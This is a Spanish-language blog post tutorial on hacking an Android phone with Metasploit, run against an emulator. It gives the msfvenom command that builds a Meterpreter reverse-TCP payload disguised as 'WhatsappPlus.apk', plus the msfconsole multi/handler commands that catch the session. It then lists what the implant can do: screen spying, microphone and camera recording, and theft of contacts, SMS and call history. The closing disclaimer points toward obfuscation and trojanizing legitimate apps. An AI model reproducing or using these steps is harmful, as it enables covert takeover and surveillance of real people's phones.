---
layout: post
category: red
tags: hack android meterpreter msfvenom msfconsole metasploit
author: RedDev
title : Vamos a hackear un móvil android
---

# Introducción
En este artículo vamos a conocer una de las maneras más comunes con las cuales los hackers ganan acceso a nuestros dispositivos android.

# Herramientas a utilizar 
- Emulador android 7.0
- Sistema Kali Linux
- Metasploit

# Manos a la obra
## 1.Creando el payload
Para este fin usaremos msfvenom, una de las herramientas de MetasPloit, como nuestro objetivo es un móvil android usaremos el siguiente comando:
```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.126.145 LPORT=4444 R > WhatsappPlus.apk
```
Siendo LHOST nuestra ip, en este caso privada y el LPORT el puerto de escucha.
El payload es de tipo meterpreter, este tipo de virus es muy peligroso ya que funciona por medio de inyecciones dinamicas en memoria, lo que lo hace difícil de detectar y además permite el uso de otros exploits de forma fácil.
![image](https://github.com/reycotallo98/reycotallo98.github.io/assets/93315382/602b5004-d20c-4eb2-b4dc-477b00588fea)

## 2.Usando el listener
Primero abrimos msfconsole
```bash
msfconsole
```
Tras esto usamos: 
```bash
use multi/handler/
set payload android/meterpreter/reverse_tcp
```
Tras esto configuraremos el listener.
Por defecto está así:
```bash
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (android/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```
Por lo que solo tendremos que configurar nuestro LHOST de esta forma:
```bash
set lhost eth0
```
Siendo eth0 nuestra interfaz de red por la que estaremos en escucha, aunque también podemos escribir nuestra IP privada a mano
Trás esto escribimos:
```bash
run
```
Y a funcionar :)
![Captura de pantalla 2023-05-26 011413](https://github.com/reycotallo98/reycotallo98.github.io/assets/93315382/98354012-f3a5-4f3b-b49c-1e480bac7800)

## 3.Pasando e instalando el apk maliciosa
Descargamos la apk en el dispositivo:
![Captura de pantalla 2023-05-26 011816](https://github.com/reycotallo98/reycotallo98.github.io/assets/93315382/cd602b93-315a-4959-bde3-410427a4595d)

Ahora procedemos a instalarla, y una vez abierta, obtenemos la sesión:
![Captura de pantalla 2023-05-26 012015](https://github.com/reycotallo98/reycotallo98.github.io/assets/93315382/bea26a17-1200-411d-8712-bbcb0e159839)

Ahora vamos a ver las opciones que nos brinda este tipo de virus:
![Captura de pantalla 2023-05-26 012015](https://github.com/reycotallo98/reycotallo98.github.io/assets/93315382/2f15b637-3cac-4f58-8f5b-4fde56cc2f78)
Entre las opciones que nso brinda esta:
- Espiar la pantalla del dispositivo
- Grabar el micrófono o la webcam
- Iniciar aplicaciones
- Enviar SMSs
- Geolocalizar el dispositivo
- Robar el historial de llamadas, contactos, SMSs
- Esconder la aplicación maliciosa
- Instalar aplicaciones...

# Conclusiones
Como veis este tipo de virus son muy peligrosos, pudiendo hacer mucho daño al usuario.
Como disclamer, quiero recalcar que este método no es efectivo a día de hoy ya que el antivirus de android y lo "extraña que es la app", es difícil de hacela efectiva esta técnica, para esto se utilizan diversas técnicas como ofuscación o esconder el payload en una app veridica y de esta forma usar la app como caballo de troya.

